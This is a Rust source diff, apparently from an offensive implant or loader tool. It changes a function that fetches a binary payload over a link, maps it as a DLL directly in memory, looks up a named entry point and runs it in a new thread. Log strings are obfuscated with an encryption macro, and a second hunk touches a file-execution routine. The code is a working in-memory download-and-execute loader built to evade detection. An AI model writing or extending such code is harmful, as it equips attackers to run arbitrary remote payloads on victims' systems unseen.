@@ -85,24 +85,31 @@ impl DllFromMemory {
     #[cfg(target_os = "windows")]
     pub fn dll_from_memory(&self) -> Result<(), anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data()?;
-        let mydll: &[u8] = &data;
 
-        info!("{}", encrypt_string!("Map DLL in memory"));
-        let mm = memorymodule_rs::MemoryModule::new(mydll);
+        let thread_dll_entrypoint = self.dll_entrypoint.clone();
+        let dllthread = thread::spawn(move || {
+            let dll_data: &[u8] = &data;
 
-        info!(
-            "{}{}",
-            encrypt_string!("Retreive DLL entrypoint: "),
-            &self.dll_entrypoint
-        );
-        let dll_entry_point =
-            unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint)) };
-        info!("{}", encrypt_string!("dll_entry_point()"));
+            info!("{}", encrypt_string!("Map DLL in memory"));
+            let mm = memorymodule_rs::MemoryModule::new(dll_data);
 
-        let result = dll_entry_point();
-        debug!("{}{}", encrypt_string!("DLL result = "), result);
+            info!(
+                "{}{}",
+                encrypt_string!("Retreive DLL entrypoint: "),
+                &thread_dll_entrypoint
+            );
+            let dll_entry_point = unsafe {
+                mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
+            };
+            info!("{}", encrypt_string!("dll_entry_point()"));
+
+            let result = dll_entry_point();
+            debug!("{}{}", encrypt_string!("DLL result = "), result);
+        });
+
         //TODO quand on part d'ici, il y a un probleme
-        info!("{}", encrypt_string!("-> TODO repair unsafe"));
+        //info!("{}", encrypt_string!("-> TODO repair unsafe"));
+        
         Ok(())
     }
 }
@@ -365,7 +372,7 @@ impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<(), anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
-        info!("Exec {:?} {}",&path,&self.cmdline);
+        info!("Exec {:?} {}", &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
         for i in self.cmdline.trim().split_whitespace() {
